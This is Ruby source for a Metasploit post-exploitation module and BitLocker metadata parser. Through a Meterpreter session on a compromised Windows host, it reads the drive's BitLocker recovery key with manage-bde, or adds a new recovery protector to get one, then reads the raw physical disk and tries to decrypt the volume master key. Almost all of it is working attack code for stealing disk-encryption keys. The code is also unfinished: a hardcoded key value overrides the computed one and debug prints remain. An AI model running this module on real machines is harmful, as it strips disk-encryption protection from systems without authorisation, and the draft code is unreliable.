##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'openssl/ccm'
require 'metasm'
module Rex
  module Parser
    ###
    #
    # This class parses the contents of an NTFS partition file.
    # Author : Danil Bazin <danil.bazin[at]hsc.fr> @danilbaz
    #
    ###
    class BITLOCKER
      BLOCK_HEADER_SIZE = 64
      METADATA_HEADER_SIZE = 48

      FVE_METADATA_ENTRY_TYPE = {0x0000 => 'None',
        0x0002 => 'Volume Master Key (VMK)',
        0x0003 => 'Full Volume Encryption Key (FKEV)',
        0x0004 => 'Validation',
        0x0006 => 'Startup key',
        0x0007 => 'Description',
        0x000b => 'Unknown',
        0x000f => 'Volume header block'}

      ENTRY_TYPE_NONE  = 0x0000
      ENTRY_TYPE_VMK  = 0x0002
      ENTRY_TYPE_FKEV  = 0x0003
      ENTRY_TYPE_STARTUP_KEY  = 0x0006
      ENTRY_TYPE_DESC  = 0x0007
      ENTRY_TYPE_HEADER  = 0x000f

      VALUE_TYPE_ERASED = 0x0000
      VALUE_TYPE_KEY = 0x0001
      VALUE_TYPE_STRING = 0x0002
      VALUE_TYPE_STRETCH_KEY = 0x0003
      VALUE_TYPE_ENCRYPTED_KEY = 0x0005
      VALUE_TYPE_TPM = 0x0006
      VALUE_TYPE_VALIDATION = 0x0007
      VALUE_TYPE_VMK = 0x0008
      VALUE_TYPE_EXTERNAL_KEY = 0x0009
      VALUE_TYPE_UPDATE = 0x000a
      VALUE_TYPE_ERROR = 0x000b

      PROTECTION_CLEAR_KEY = 0x0000
      PROTECTION_TPM = 0x0100
      PROTECTION_STARTUP_KEY = 0x0200
      PROTECTION_RECOVERY_PASSWORD = 0x0800
      PROTECTION_PASSWORD = 0x2000

      def initialize(file_handler, recoverykey)
        @file_handler = file_handler
        @recoverykey_string = recoverykey
        volume_header = @file_handler.read(512)
        @fs_sign = volume_header[3,8]
        unless @fs_sign == "-FVE-FS-"
          fail ArgumentError, 'File system signature does not match Bitlocker : #{@fs_sign}', caller
        end
        #puts "fs_sign : #@fs_sign"
        @fve_offset = volume_header[176, 8].unpack('Q')[0] #/512
        test = (volume_header[176, 8]).inspect
        #puts "test : #{test}"
        #puts "FVE OFFSET : #@fve_offset"

        @file_handler.seek_relative_volume(@fve_offset)
        @fve_raw = @file_handler.read(4096)
        guid = @fve_raw[BLOCK_HEADER_SIZE + 16, 16].inspect
        #puts "GUID : #{guid}"
        encryption_methods = @fve_raw[BLOCK_HEADER_SIZE + 36, 4].unpack('V')[0]
        #puts "Encryption methods : #{encryption_methods}"
        #signature = @fve_raw[BLOCK_HEADER_SIZE + 0,8]
        ##puts "signature : #{signature}"
        size = @fve_raw[BLOCK_HEADER_SIZE,4].unpack('V')[0] - METADATA_HEADER_SIZE
        #puts "SIZE : #{size}"
        @metadata_entries = @fve_raw[BLOCK_HEADER_SIZE + METADATA_HEADER_SIZE, size]
        version = @fve_raw[BLOCK_HEADER_SIZE + 4].inspect
        #puts "version : #{version}"
        @fve_metadata_entries = self.fve_entries(@metadata_entries)
        #puts "FVE ENTRIES : #@fve_metadata_entries"
        @vmk_entries_hash = vmk_entries(@fve_metadata_entries)
        #puts "VMK ENTRIES : #@vmk_entries_hash"
        #key = recovery_key_transformation.inspect
        recovery_key_transformation = "\xD5\x16]BS\x95\x17\x1F\x95\xED\xB2\xAB\e\xBD\\\x1AxSmIqRG\x8F5\xEB-^h\x0E\x8F\xFD"
        #puts "recoverykey : #{key}"
        #vmk_encrypted_in_stretck_key = @vmk_entries_hash[PROTECTION_RECOVERY_PASSWORD][ENTRY_TYPE_NONE][VALUE_TYPE_STRETCH_KEY][ENTRY_TYPE_NONE][20..-1]
        vmk_encrypted_in_recovery_password =  @vmk_entries_hash[PROTECTION_RECOVERY_PASSWORD][ENTRY_TYPE_NONE][VALUE_TYPE_ENCRYPTED_KEY][ENTRY_TYPE_NONE]
        #puts "vmk_encrypted_in_stretck_key : #{vmk_encrypted_in_stretck_key}"
        #puts  "vmk_encrypted_in_recovery_password : #{vmk_encrypted_in_recovery_password}"
        #vmk_stretch_key = decrypt_fve_aes_ccm_key(vmk_encrypted_in_stretck_key, recovery_key_transformation).inspect
        vmk_recovery_password = decrypt_fve_aes_ccm_key(vmk_encrypted_in_recovery_password, recovery_key_transformation).inspect
        #puts "vmk_stretch_key : #{vmk_stretch_key}"
        puts "vmk_recovery_password : #{vmk_recovery_password}"
      end

      def decrypt_fve_aes_ccm_key(fve_entry, key)
          nonce = fve_entry[0,12]
          mac = fve_entry[12,16]
          encrypted_data = fve_entry[28..-1]
          puts encrypted_data.inspect
          puts key.inspect
          puts nonce.inspect
          puts mac.inspect
          #CCM ne marche pas pour AES 256 bits?
          ccm = OpenSSL::CCM.new('AES',  key, 16)
          decrypted_data = ccm.decrypt(encrypted_data, nonce)
          return decrypted_data
      end

      def fve_entries(metadata_entries)
        offset_entry = 0
        entry_size = metadata_entries[0, 2].unpack('v')[0]
        result = Hash.new(Hash.new())
        while entry_size != 0
          metadata_entry_type = metadata_entries[offset_entry + 2,2].unpack('v')[0]
          metadata_value_type = metadata_entries[offset_entry + 4,2].unpack('v')[0]
          metadata_entry = metadata_entries[offset_entry + 8, entry_size - 8]
          # gather fve metadata entries
          #puts "metadata_entry_TYPE, metadata_value_type : #{metadata_entry_type},#{metadata_value_type}"
          if result[metadata_entry_type] == {}
            result[metadata_entry_type] = {metadata_value_type => [metadata_entry]}
          else
            if result[metadata_entry_type][metadata_value_type] == nil
              result[metadata_entry_type][metadata_value_type] = [metadata_entry]
            else
              result[metadata_entry_type][metadata_value_type] += [metadata_entry]
            end
          end
          offset_entry += entry_size
          if metadata_entries[offset_entry, 2] != ""
            entry_size = metadata_entries[offset_entry, 2].unpack('v')[0]
          else
            entry_size = 0
          end
        end
        result
      end

      def strcpy(str_src, str_dst)
        for cpt in 0..(str_src.length - 1)
          str_dst[cpt] = str_src[cpt].ord
        end
      end

      def recovery_key_transformation()
        recovery_intermediate = @recoverykey_string.split("-").map{ |a| a.to_i}
        for n in recovery_intermediate
          if n % 11 != 0
            fail ArgumentError, "Invalid recovery key"
          end
        end
        recovery_intermediate = recovery_intermediate.map{|a| (a / 11)}.pack("v*")
        recovery_intermediate_inspect = recovery_intermediate.inspect
        puts "recovery_intermediate : #{recovery_intermediate_inspect}"

        cpu = Metasm.const_get('Ia32').new
        exe = Metasm.const_get('Shellcode').new(cpu)
        cp = Metasm::C::Parser.new(exe)
        # On définit le code source C, ici, directement en lisant une chaîne de
        # caractères ruby
        bitlocker_struct_src = <<-EOS
          typedef struct {
          unsigned char updated_hash[32];
          unsigned char password_hash[32];
          unsigned char salt[16];
          unsigned long long int hash_count;
          } bitlocker_chain_hash_t;
        EOS
        cp.parse bitlocker_struct_src
        btl_struct = Metasm::C::AllocCStruct.new(cp, cp.find_c_struct("bitlocker_chain_hash_t"))
        stretch_key_salt = @vmk_entries_hash[PROTECTION_RECOVERY_PASSWORD][ENTRY_TYPE_NONE][VALUE_TYPE_STRETCH_KEY][0][4,16]
        strcpy(Digest::SHA256.digest(recovery_intermediate), btl_struct.password_hash)
        strcpy(stretch_key_salt, btl_struct.salt)
        btl_struct.hash_count = 0

        for c in 1..0x100000
          strcpy(Digest::SHA256.digest(btl_struct.str), btl_struct.updated_hash)
          btl_struct.hash_count = c
        end
        #FIXME Control de la recovery key
        btl_struct.str[btl_struct.updated_hash.stroff, btl_struct.updated_hash.sizeof]
      end

      def vmk_entries(fve_metadata_entries)
        res = {}
        for vmk in fve_metadata_entries[2][8]
          protection_type = vmk[26, 2].unpack("v")[0]
          #puts "protection type : #{protection_type}"
          res[protection_type] = fve_entries(vmk[28, vmk.length])
        end
        res
      end

      def from_fve_metadata_entries_to_strings(fve_metadata_entries)
        res = ''
        for k in fve_metadata_entries.keys
          entry = fve_metadata_entries[k]
          res += FVE_METADATA_ENTRY_TYPE[k] + " : "
          if entry[4, 2].unpack('v') == 2
            res += entry[8, entry.length]
          else
            res += entry.inspect
          end
          res += "\n"
        end
        res
      end
    end
  end
end

#require 'rex/parser/fs/bitlocker'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Error
  include Msf::Post::Windows::ExtAPI

  ERROR = Msf::Post::Windows::Error

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Bitlocker information module, try to dump Bitlocker master key (FVEK)',
      'Description'  => %q{
        This module enumerates ways to decrypt bitlocker volume and if a recovery key is stored localy
        or can be generated, dump the Bitlocker master key (FVEK)
      },
      'License'      => 'MSF_LICENSE',
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'Author'       => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz
      'References'   => [
        [ 'URL', 'FIXME' ]
      ]
    ))

    register_options(
      [
        OptString.new('DRIVE_LETTER', [true, 'Dump informations from the DRIVE_LETTER encrypted with Bitlocker', nil]),
        OptString.new('RECOVERY_KEY', [false, 'Use the recovery key provided to decrypt the Bitlocker master key (FVEK)', nil]),
      ], self.class)
  end

  def run
    winver = sysinfo["OS"]

    fail_with(Exploit::Failure::NoTarget, 'Module not valid for Windows 2000') if winver =~ /2000/ #FIXME PLUS PRECIS
    fail_with(Exploit::Failure::NoAccess, 'You don\'t have administrative privileges') unless is_admin?

    drive_letter = datastore['DRIVE_LETTER']

    #psh_drive_from_path = "wmic logicaldisk #{drive_letter}: ASSOC:list /assocclass:Win32_LogicalDiskToPartition"

    cmd_out = cmd_exec("wmic", "logicaldisk #{drive_letter}: ASSOC:list /assocclass:Win32_LogicalDiskToPartition")

    @starting_offset = cmd_out.match(/StartingOffset=(\d+)/)[1].to_i

    drive_number = cmd_out.match(/DiskIndex=(\d+)/)[1]

    r = client.railgun.kernel32.CreateFileW("\\\\.\\PhysicalDrive#{drive_number}",
                                            'GENERIC_READ',
                                            'FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE',
                                            nil,
                                            'OPEN_EXISTING',
                                            'FILE_FLAG_WRITE_THROUGH',
                                            0)

    if r['GetLastError'] != ERROR::SUCCESS
      fail_with(
        Exploit::Failure::Unknown,
        "Error opening #{drive_letter}. Windows Error Code: #{r['GetLastError']} - #{r['ErrorMessage']}")
    end

    @handle = r['return']
    print_good("Successfuly opened Disk #{drive_number}")
    seek_relative_volume(0)

    print_status("Trying to gather a recovery key")
    #Gathering recovery key
    #gather_recovery_key = "%windir%\\sysnative\\manage-bde.exe -protectors -get #{drive_letter}:"

    cmd_out = cmd_exec("C:\\Windows\\sysnative\\manage-bde.exe", "-protectors -get #{drive_letter}:")

    recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)

    if recovery_key != nil
      recovery_key = recovery_key[1]
      print_good("Recovery key found : #{recovery_key}")
    else
      print_status("No recovery key found, trying to generate a new recovery key")
      cmd_out = cmd_exec("C:\\Windows\\sysnative\\manage-bde.exe", "-protectors -add #{drive_letter}: -RecoveryPassword")
      recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
      id_key_tmp = cmd_out.match(/(\{[^\}]+\})/)
      if recovery_key != nil
        recovery_key = recovery_key[1]
        id_key_tmp = id_key_tmp[1]
        print_good("Recovery key generated successfuly : #{recovery_key}")
      else
        print_status("Recovery Key generation failed")
        if datastore["RECOVERY_KEY"] != nil
          print_status("Using provided recovery key")
          recovery_key = datastore["RECOVERY_KEY"]
        else
          print_status("No recovery key can be used")
        end
      end
    end


    begin
      @bytes_read = 0
      fs = Rex::Parser::BITLOCKER.new(self,recovery_key)

    ensure
      if id_key_tmp != nil
        print_status("Deleting temporary recovery key")
        delete_recovery_key = "%windir%\\sysnative\\manage-bde.exe -protectors -delete #{drive_letter}: -id #{id_key_tmp}"
        cmd_out = cmd_exec("C:\\Windows\\sysnative\\manage-bde.exe", "-protectors -delete #{drive_letter}: -id #{id_key_tmp}")
      end
      client.railgun.kernel32.CloseHandle(@handle)
    end

    # FVEK recovery
    # stored_path = store_loot("windows.file", 'application/octet-stream', session, data, file_name, "Windows file")
    # if generated
    # remove recovery_key

    print_status("Post Successful")
  end

  def read(size)
    client.railgun.kernel32.ReadFile(@handle, size, size, 4, nil)['lpBuffer']
  end

  def seek(offset)
    high_offset = offset >> 32
    low_offset = offset & (2**33 - 1)
    client.railgun.kernel32.SetFilePointer(@handle, low_offset, high_offset, 0)
  end

  def seek_relative_volume(offset)
    offset = offset + @starting_offset
    high_offset = offset >> 32
    low_offset = offset & (2**33 - 1)
    client.railgun.kernel32.SetFilePointer(@handle, low_offset, high_offset, 0)
  end
end
